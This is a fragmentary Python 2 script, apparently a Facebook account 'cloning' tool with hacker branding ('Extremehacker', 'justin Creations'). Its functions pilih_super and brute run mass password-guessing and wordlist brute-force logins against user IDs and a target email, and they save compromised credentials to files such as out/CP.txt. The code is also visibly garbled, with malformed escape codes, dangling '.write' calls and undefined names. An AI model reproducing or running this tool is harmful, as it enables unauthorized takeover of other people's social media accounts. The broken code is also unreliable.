...
logo = """
\033[1;91sec       ♦♦♦———————————————————————————————♦♦♦
\033[1;96sec          _____                     _ _ 
\033[1;96sec         / ____|                   | (_) ⚡
\033[1;96sec        | (___  _ __   ___  ___  __| |_  
\033[1;96sec         \___ \| '_ \ / _ \/ _ \/ _` | | 
\033[1;96sec         ____) | |_) |  __/  __/ (_| | |
\033[1;96sec        |_____/| .__/ \___|\___|\__,_|_|
\033[1;96sec               | |                      
\033[1;96sec               |_|   justin update 10000.3             
\033[1;91sec       ♦♦♦———————————————————————————————♦♦♦
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93secPlease Wait \x1b[1;93sec"+o),;sys.stdout.flush();time.sleep(1)
...
jalan("\033[1;97sec•◈•───────•◈ NOT A NAME ITS BRAND •◈•───────•◈•")  


jalan("\033[1;96sec•◈•   _____ _____  ______ ______ _____ _____ ")
jalan("\033[1;96sec•◈•  / ____|  __ \|  ____|  ____|  __ \_   _|")
jalan("\033[1;97sec•◈• | (___ | |__) | |__  | |__  | |  | || |  ")
jalan("\033[1;96sec•◈•  \___ \|  ___/|  __| |  __| | |  | || |  ")
jalan("\033[1;96sec•◈•  ____) | |    | |____| |____| |__| || |_ ")
jalan("\033[1;96sec•◈• |_____/|_|    |______|______|_____/_____|")
 
jalan("   \033[1;91sec All USERZ USE ANY PROXY ")	
jalan("   \033[1;91sec WIFI USERZ USE ANY PROXY ")	

jalan("   \033[1;93sec Welcome to justin Creations ")

jalan("\033[1;97sec•◈•──────────•◈•\033[1;96secExtremehacker\033[1;96sec•◈•──────────•◈•")

CorrectUsername = justin
CorrectPassword = justin


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96sec[☆] \x1b[1;97secUSER ID \x1b[1;96sec>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96sec[☆] \x1b[1;97secPASWORD \x1b[1;96sec>>>> ")
...
def login():
	...
	try:
		...
		try:
			...
			print"\n\033[1;96sec[!] \x1b[1;91secThere is no internet connection"
			keluar()
		...
		if 'working' in url:
			...
			print("\n\033[1;97secPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
...
def menu():
	...
	try:
		...
		os.system('clear')
		print"\033[1;97seclogin account"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
	...
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+justin+"  	   \033[1;36;40m║"                               
	...
	print "\033[1;32;40m[2] \033[1;33;40m══Update Justin'																														
...
def pilih_super():
	...
	jalan('                    \033[1;97mJustin start cloning Wait...')
	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\033[1;97m[Login Now] \033[1;97sec ' + user  + ' \033[1;97sec | \033[1;97sec ' + pass1 + ' 👽 ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[After24Hr] \033[1;97sec ' + user  + ' \x1b[1;36;40m|\033[1;97sec ' + pass1 + ' 👽 ' + b['name']
					...
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;97sec[Login Now] \033[1;97m ' + user  + ' \033[1;97sec | \033[1;97sec ' + pass2 + ' 👽 ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[After24Hr] \033[1;97sec ' + user  + ' \x1b[1;36;40sec|\033[1;97sec ' + pass2 + ' 👽 ' + b['name']
							cek = open("out/CP.txt", "a")
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97sec ' + user  + ' \033[1;97m | \033[1;97m ' + pass4 + ' 👽 ' + b['name']
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[Login Now] \033[1;97sec ' + user  + ' \x1b[1;36;40sec|\033[1;97sec ' + pass5 + ' 👽 ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40sec[After24Hr] \033[1;97sec ' + user  + ' \x1b[1;36;40sec|\033[1;97sec ' + pass5 + ' 👽 ' + b['name']
													cek = open("out/CP.txt", "a")
													.write(user+"|"+pass5+"\n")
													open()
	...
	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;97sec....'
	print "\033[1;32;40m[+] Total OK/\033[1;97mCP \033[1;97sec: \033[1;97sec"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
...
def brute():
    ...
    try:
        ...
        try:
            ...
            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
            print '\033[1;97m[\033[1;97m\xe2\x9c\x93\033[1;97m] \033[1;97mTarget \033[1;97sec:\033[1;97sec ' + email
            print '\033[1;97m[+] \033[1;97mTotal\033[1;97m ' + str(len(total)) + ' \033[1;97secPassword'
            jalan('\033[1;97m[\xe2\x9c\xba] \033[1;97mPlease wait \033[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[1;97m[\033[1;97m\xe2\x9c\xb8\033[1;97m] \033[1;97secTry \033[1;97sec' + pw)
                    sys.stdout.flush()
